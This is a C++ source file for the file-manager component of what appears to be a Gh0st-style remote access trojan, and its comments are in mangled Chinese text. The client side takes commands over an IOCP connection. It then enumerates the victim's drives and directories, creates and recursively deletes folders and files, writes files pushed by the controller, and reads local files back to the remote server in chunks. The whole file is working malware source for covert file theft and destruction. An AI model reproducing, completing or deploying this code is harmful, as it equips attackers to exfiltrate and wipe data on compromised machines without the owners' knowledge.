#include "FileManager.h"
#include "Common.h"


CFileManager::CFileManager(_CIOCPClient * IOCPClient) :CManager(IOCPClient)
{
	printf("CFileManager()\r\n");
	m_TransferMode = TRANSFER_MODE_NORMAL;
	SendClientVolumeList();
}

CFileManager::~CFileManager()
{
	printf("~CFileManager()\r\n");
}

VOID CFileManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_FILE_MANAGER_FILE_LIST:
	{
		SendClientFilesList((PBYTE)BufferData + 1);   //��һ���ֽ�����Ϣ �������·��
		break;
	}
	
	case CLIENT_FILE_MANAGER_NEW_FLODER:
	{
		CreateNewFloder((PBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	case CLIENT_FILE_MANAGER_DELETE_FLODER:
	{
		int Token = CLIENT_FILE_MANAGER_DELETE_REPLY;
		BOOL IsOk = DeleteDirectory((LPCTSTR)BufferData + 1);	
		char* Data = new char[5];
		memset(Data, 0, 5);
		memcpy(Data, &Token, sizeof(BYTE));
		memcpy(Data + 1, &IsOk, sizeof(BOOL));
		m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
		if (Data != NULL)
		{
			delete[] Data;
			Data = NULL;
		}
		break;
	}
	case CLIENT_FILE_MANAGER_DELETE_FILE:
	{
		int Token = CLIENT_FILE_MANAGER_DELETE_REPLY;
		BOOL IsOk = DeleteFile((LPCTSTR)BufferData + 1);
		char* Data = new char[5];
		memset(Data, 0, 5);
		memcpy(Data, &Token, sizeof(BYTE));
		memcpy(Data + 1, &IsOk, sizeof(BOOL));
		m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
		if (Data != NULL)
		{
			delete[] Data;
			Data = NULL;
		}
		break;
	}
	case CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION:
	{
		//�������ͻ��˴�������
		//�����ͻ��˽����ļ�
		CreateClientReceiveFileInfo(BufferData + 1);
	}
	case CLIENT_FILE_MANAGER_SET_TRANSFER_MODE:
	{
		SetTransferMode(BufferData + 1);
		break;
	}
	case CLIENT_FILE_MANAGER_FILE_DATA:
	{
		WriteClientReceiveFile(BufferData + 1, BufferLength - 1);
		break;
	}
	//������Ҫ�ӿͻ��˿���һ���ļ��� ����Ҫ���ļ��������ļ�·�����͸�������
	case CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH:
	{
		FixedClientToServerDirectory((char*)(BufferData + 1));
		break;
	}
	//�����Ҫ���������������ļ����ļ�·��
	case CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT:
	{

		GetTheFileInfo(BufferData + 1, BufferLength - 1);
		break;
	}
	//��Ҫ�����ļ����ݵ��ͻ���
	case CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER:
	{
		SendFileData(BufferData + 1);
		break;
	}
	}
}
//��ñ��ض˵Ĵ�����Ϣ
ULONG CFileManager::SendClientVolumeList()             
{
	char	VolumeListData[0x500] = { 0 };
	// ǰһ���ֽ�Ϊ��Ϣ���ͣ������52�ֽ�Ϊ���������������
	BYTE	BufferData[0x1000] = { 0 };
	char	FileSystemInfo[MAX_PATH] = { 0 };
	char	*Travel = NULL;
	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;    
	// �������б�
	GetLogicalDriveStrings(sizeof(VolumeListData), VolumeListData);

	Travel = VolumeListData;
	//�������������Ϣ
	unsigned __int64	HardDiskAmount = 0;   //HardDisk
	unsigned __int64	HardDiskFreeSpace = 0;
	unsigned long		HardDiskAmountMB = 0;   // �ܴ�С
	unsigned long		HardDiskFreeSpaceMB = 0;   // ʣ��ռ�
												  
	//ע�������dwOffset���ܴ�0 ��Ϊ0��λ�洢������Ϣ����
	DWORD Offset = 0;
	for (Offset = 1; *Travel != '\0'; Travel += lstrlen(Travel) + 1)//�����+1Ϊ�˹�\0
	{
		memset(FileSystemInfo, 0, sizeof(FileSystemInfo));  //�ļ�ϵͳ NTFS

		// �õ��ļ�ϵͳ��Ϣ����С��FileSystemInfo
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystemInfo, MAX_PATH);
		ULONG	FileSystemLength = lstrlen(FileSystemInfo) + 1;

		SHFILEINFO	v1;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &v1,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		ULONG HardDiskTypeNameLength = lstrlen(v1.szTypeName) + 1;
		// ������̴�С
		if (Travel[0] != 'A' && Travel[0] != 'B'
			&& GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace,
			(PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;         //���������ֽ�Ҫת����G
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}
		// ��ʼ��ֵ


		BufferData[Offset] = Travel[0];                       //�̷�
		BufferData[Offset + 1] = GetDriveType(Travel);        //������������
															  // ���̿ռ�����ռȥ��8�ֽ�
		memcpy(BufferData + Offset + 2, &HardDiskAmountMB, sizeof(unsigned long));
		memcpy(BufferData + Offset + 6, &HardDiskFreeSpaceMB, sizeof(unsigned long));

		//0                       1  2       4  4
		//TOKEN_VOLUME_DEVICE_LISTC����������5030
		// ���̾��������������
		memcpy(BufferData + Offset + 10, v1.szTypeName, HardDiskTypeNameLength);
		memcpy(BufferData + Offset + 10 + HardDiskTypeNameLength, FileSystemInfo,
			FileSystemLength);

		Offset += 10 + HardDiskTypeNameLength + FileSystemLength;
	}
	return 	m_IOCPClient->OnSending((char*)BufferData, Offset);
}
//��ñ��ض˵��ļ�����
int CFileManager::SendClientFilesList(PBYTE DirectoryPath)
{
	// ���ô��䷽ʽ
	//m_TransferMode = TRANSFER_MODE_NORMAL;


	DWORD	Offset = 0; // λ��ָ��
	char*   BufferData = NULL;
	ULONG   BufferLength = 1024 * 10; // �ȷ���10K�Ļ�����

	BufferData = (char*)LocalAlloc(LPTR, BufferLength);
	if (BufferData == NULL)
	{
		return 0;
	}
	char v1[MAX_PATH];

	wsprintf(v1, "%s\\*.*", DirectoryPath);
	//szDirectoryFullPath = D:\\*.*

	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA	wfd;
	FileHandle = FindFirstFile(v1, &wfd);

	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		BYTE IsToken = CLIENT_FILE_MANAGER_FILE_LIST_REPLY;

		if (BufferData != NULL)
		{
			LocalFree(BufferData);
			BufferData = NULL;
		}
		return m_IOCPClient->OnSending((char*)&IsToken, 1);
	}
	BufferData[0] = CLIENT_FILE_MANAGER_FILE_LIST_REPLY;
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	Offset = 1;

	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/

	do
	{
		// ��̬��չ������
		if (Offset > (BufferLength - MAX_PATH * 2))
		{
			BufferLength += MAX_PATH * 2;
			BufferData = (char*)LocalReAlloc(BufferData,
				BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		char* FileName = wfd.cFileName;
		if (strcmp(FileName, ".") == 0 || strcmp(FileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�

		//[Flag 1 HelloWorld\0��С ��С ʱ�� ʱ�� 
		//      0 1.txt\0 ��С ��С ʱ�� ʱ��]
		*(BufferData + Offset) = wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;   //1  0 
		Offset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		ULONG FileNameLength = strlen(FileName);
		memcpy(BufferData + Offset, FileName, FileNameLength);
		Offset += FileNameLength;
		*(BufferData + Offset) = 0;
		Offset++;

		// �ļ���С 8 �ֽ�
		memcpy(BufferData + Offset, &wfd.nFileSizeHigh, sizeof(DWORD));
		memcpy(BufferData + Offset + 4, &wfd.nFileSizeLow, sizeof(DWORD));
		Offset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(BufferData + Offset, &wfd.ftLastWriteTime, sizeof(FILETIME));
		Offset += 8;
	} while (FindNextFile(FileHandle, &wfd));

	ULONG v7 = m_IOCPClient->OnSending(BufferData, Offset);
	LocalFree(BufferData);
	FindClose(FileHandle);
	return v7;
}
//�����µ��ļ���
VOID CFileManager::CreateNewFloder(PBYTE BufferData, ULONG BufferLength)
{
	int Token = CLIENT_FILE_MANAGER_NEW_FLODER_REPLY;
	BOOL IsOk = MakeSureDirectoryPathExists((char*)BufferData);

	char* Data = new char[5];
	memset(Data, 0, 5);
	memcpy(Data, &Token, sizeof(BYTE));
	memcpy(Data + 1, &IsOk, sizeof(BOOL));
	m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
	if (Data != NULL)
	{
		delete[] Data;
		Data = NULL;
	}
}
//�������Ŀ¼
BOOL CFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath)
{
	char* Travel = NULL;
	char* BufferData = NULL;
	DWORD DirectoryAttributes;
	__try
	{
		BufferData = (char*)malloc(sizeof(char)*(strlen(DirectoryFullPath) + 1));
		if (BufferData == NULL)
		{
			return FALSE;
		}
		strcpy(BufferData, DirectoryFullPath);
		Travel = BufferData;
		if (*(Travel + 1) == ':')
		{
			Travel++;
			Travel++;
			if (*Travel && (*Travel == '\\'))
			{
				Travel++;
			}
		}
		//���Ŀ¼
		while (*Travel)           //D:\Hello\\World\Shit\0
		{
			if (*Travel == '\\')
			{
				*Travel = '\0';
				DirectoryAttributes = GetFileAttributes(BufferData);   //�鿴�Ƿ��Ƿ�Ŀ¼  Ŀ¼������
				if (DirectoryAttributes == 0xffffffff)
				{
					if (!CreateDirectory(BufferData, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(BufferData);
							return FALSE;
						}
					}
				}
				else
				{
					if ((DirectoryAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(BufferData);
						BufferData = NULL;
						return FALSE;
					}
				}

				*Travel = '\\';
			}

			Travel = CharNext(Travel);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (BufferData != NULL)
		{
			free(BufferData);
			BufferData = NULL;
		}
		return FALSE;
	}
	if (BufferData != NULL)
	{
		free(BufferData);
		BufferData = NULL;
	}
	return TRUE;
}
//ɾ���ļ����У�
BOOL CFileManager::DeleteDirectory(LPCTSTR DirectoryFullPath)
{
	WIN32_FIND_DATA	wfd;
	char	BufferData[MAX_PATH] = { 0 };

	wsprintf(BufferData, "%s\\*.*", DirectoryFullPath);

	HANDLE FileHandle = FindFirstFile(BufferData, &wfd);
	if (FileHandle == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return FALSE;

	do
	{
		if (wfd.cFileName[0] == '.'&&strlen(wfd.cFileName) <= 2)
		{
			continue;
		}
		else
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char v1[MAX_PATH];
				wsprintf(v1, "%s\\%s", DirectoryFullPath, wfd.cFileName);
				DeleteDirectory(v1);
			}
			else
			{
				char v1[MAX_PATH];
				wsprintf(v1, "%s\\%s", DirectoryFullPath, wfd.cFileName);
				DeleteFile(v1);
			}
		}
	} while (FindNextFile(FileHandle, &wfd));

	FindClose(FileHandle); // �رղ��Ҿ��

	if (!RemoveDirectory(DirectoryFullPath))
	{
		return FALSE;
	}
	return TRUE;
}

VOID CFileManager::CreateClientReceiveFileInfo(LPBYTE BufferData)
{
	//	//[Flag 0001 0001 E:\1.txt\0 ]
	FILE_SIZE*	v1 = (FILE_SIZE*)BufferData;
	// ���浱ǰ���ڲ������ļ���
	memset(m_FileFullPath, 0,
		sizeof(m_FileFullPath));
	strcpy(m_FileFullPath, (char *)BufferData + 8);  //�Ѿ�Խ����Ϣͷ��
										             // �����ļ�����
	m_OperatingFileLength =
		(v1->FileSizeHigh * (MAXDWORD + 1)) + v1->FileSizeLow;

	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_FileFullPath);

	WIN32_FIND_DATA wfa;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &wfa);


	//1 2 3         1  2 3
	if (FileHandle != INVALID_HANDLE_VALUE
		&& m_TransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_TransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//�������ͬ���ļ�

		BYTE	IsToken[1];
		IsToken[0] = CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE;
		m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
	}
	else
	{
		GetServerFileData();                      //���û����ͬ���ļ��ͻ�ִ�е�����
	}
	FindClose(FileHandle);
}

VOID CFileManager::SetTransferMode(LPBYTE BufferData)
{
	memcpy(&m_TransferMode, BufferData, sizeof(m_TransferMode));
	GetServerFileData();
}

VOID CFileManager::GetServerFileData()
{
	int	iTransferMode;
	switch (m_TransferMode)   //���û����ͬ�������ǲ������Case�е�
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		iTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		iTransferMode = TRANSFER_MODE_JUMP;   //CreateFile��always open����eixt��
		break;
	default:
		iTransferMode = m_TransferMode; //1.  2 3
	}

	WIN32_FIND_DATA wfa;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &wfa);

	//1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	IsToken[9] = { 0 };
	DWORD	CreationDisposition; // �ļ��򿪷�ʽ 
	memset(IsToken, 0, sizeof(IsToken));
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	// �ļ��Ѿ�����
	if (FileHandle != INVALID_HANDLE_VALUE)
	{

		// ����
		if (iTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//ƫ����0
			memset(IsToken + 1, 0, 8);//0000 0000
									 // ���´���
			CreationDisposition = CREATE_ALWAYS;    //���и���   
		}
		// ������һ��
		else if (iTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD v1 = -1;  //0000 -1
			memcpy(IsToken + 5, &v1, 4);
			CreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		memset(IsToken + 1, 0, 8);  //0000 0000              //û����ͬ���ļ����ߵ�����
								   // ���´���
		CreationDisposition = CREATE_ALWAYS;    //����һ���µ��ļ�
	}
	FindClose(FileHandle);

	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CreationDisposition,  
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	// ��Ҫ������
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);

	m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
}

VOID CFileManager::WriteClientReceiveFile(LPBYTE BufferData, ULONG BufferLength)
{
	BYTE	*Travel;
	DWORD	NumberOfBytesToWrite = 0;
	DWORD	NumberOfBytesWirte = 0;
	int		v3 = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILE_SIZE* v1;
	// �õ����ݵ�ƫ��
	Travel = BufferData + 8;

	v1 = (FILE_SIZE *)BufferData;

	// �õ��������ļ��е�ƫ��

	LONG	OffsetHigh = v1->FileSizeHigh;
	LONG	OffsetLow = v1->FileSizeLow;

	NumberOfBytesToWrite = BufferLength - 8;

	HANDLE	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);

	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);

	// д���ļ�
	WriteFile
	(
		FileHandle,
		Travel,
		NumberOfBytesToWrite,
		&NumberOfBytesWirte,
		NULL
	);

	CloseHandle(FileHandle);
	BYTE	IsToken[9];
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;//TOKEN_DATA_CONTINUE
	OffsetLow += NumberOfBytesWirte;
	memcpy(IsToken + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(IsToken + 5, &OffsetLow, sizeof(OffsetLow));
	m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));

}


/*************************  �ͻ������������ק�ļ�         *********************/
BOOL CFileManager::FixedClientToServerDirectory(char* DircetoryFullPath)
{
	CHAR BufferData[MAX_PATH];

	memset(BufferData, 0, sizeof(BufferData));

	sprintf(BufferData, "%s*.*", DircetoryFullPath);
	//BufferData���ӣ�  D:\Hello\*.*

	//�����ļ����µ��ļ�

	WIN32_FIND_DATA	wfd;
	//��һ�β���
	HANDLE FileHandle = FindFirstFile(BufferData, &wfd);

	//���û���ҵ������ʧ��
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	do
	{
		if (((wfd.cFileName[0] == '.') && (strlen(wfd.cFileName) == 1)) ||
			((wfd.cFileName[0] == '.') && (wfd.cFileName[1] == '.') && (strlen(wfd.cFileName) == 2)))
		{
			continue; // ����������Ŀ¼ '.'��'..'
		}
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			CHAR v1[MAX_PATH];
			sprintf(v1, "%s%s", DircetoryFullPath, wfd.cFileName);
			FixedClientToServerDirectory(v1); // ����ҵ�����Ŀ¼��������Ŀ¼���еݹ� 
		}
		else
		{
			CHAR FileFullPath[MAX_PATH];
			memset(FileFullPath, 0, MAX_PATH);
			FileFullPath[0] = CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_REPLY;
			sprintf(FileFullPath+1, "%s%s", DircetoryFullPath, wfd.cFileName);
			m_IOCPClient->OnSending(FileFullPath, MAX_PATH);

		}
	} while (FindNextFile(FileHandle, &wfd));

	FindClose(FileHandle); // �رղ��Ҿ��
	BYTE IsToken = CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_END;
	m_IOCPClient->OnSending((char*)&IsToken, 1);
	return true;
}

VOID CFileManager::GetTheFileInfo(PBYTE BufferData, int BufferLength)
{
	DWORD	SizeHigh;
	DWORD	SizeLow;
	//����ļ�·��
	memset(m_FileFullPath, 0, sizeof(m_FileFullPath));
	memcpy(m_FileFullPath, BufferData, BufferLength);

	//���ļ� �����ļ���С
	HANDLE FileHandle = CreateFile((LPCSTR)m_FileFullPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}
	SizeLow = GetFileSize(FileHandle, &SizeHigh);

	//��ǰ�����ļ��ܴ�С
	m_OperatingFileLength = (SizeHigh * (MAXDWORD + 1)) + SizeLow;

	BYTE IsToken[9] = { 0 };
	IsToken[0] = CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT_REPLY;
	memcpy(&IsToken[1], &m_OperatingFileLength, 8);
	m_IOCPClient->OnSending((char*)IsToken, 9);

	CloseHandle(FileHandle);
}

//�����ļ�����
VOID CFileManager::SendFileData(PBYTE BufferData)
{
	FILE_SIZE* v1 = (FILE_SIZE *)(BufferData);

	//�������ļ��е�ƫ��
	LONG	OffsetHigh = v1->FileSizeHigh;
	LONG	OffsetLow = v1->FileSizeLow;

	//ͨ��ƫ�Ƽ����Ѿ������ĳ���
	m_Counter = MAKEINT64(v1->FileSizeLow, v1->FileSizeHigh);

	//SizeLow == -1  ��ѡ�����������ļ� 
	//m_nCounter == m_OperatingFileLengthFromClient  ������˵�ǰ�Ĵ���
	if (m_Counter == m_OperatingFileLength || v1->FileSizeLow == -1)
	{
		//�����ļ�������� 
		BYTE IsToken = CLIENT_FILE_MANAGER_ONE_COPY_FILE_SUCCESS;
		m_IOCPClient->OnSending((char*)&IsToken, 1);
		return;
	}
	//���ļ�
	HANDLE	FileHandle;
	FileHandle = CreateFile((LPCSTR)(m_FileFullPath), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}

	//��λ�ļ�ָ�뵽��Ҫ��ȡ�������ݴ�  
	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);

	int		v3 = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9


	DWORD	NumberOfBytesToRead = MAX_SEND_BUFFER - v3;
	DWORD	NumberOfBytesRead = 0;

	BYTE	*SendBufferData = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	if (SendBufferData == NULL)
	{
		CloseHandle(FileHandle);
		return;
	}

	SendBufferData[0] = CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER_REPLY;
	//�������ļ��е�ƫ��
	memcpy(SendBufferData + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(SendBufferData + 5, &OffsetLow, sizeof(OffsetLow));
	//��ȡ�ļ���Ϣ
	ReadFile(FileHandle, SendBufferData + v3, NumberOfBytesToRead, &NumberOfBytesRead, NULL);
	CloseHandle(FileHandle);

	//�����ļ�����
	if (NumberOfBytesRead > 0)
	{
		ULONG	BufferLength = NumberOfBytesRead + v3;
		m_IOCPClient->OnSending((char*)SendBufferData, BufferLength);
	}
	LocalFree(SendBufferData);
}
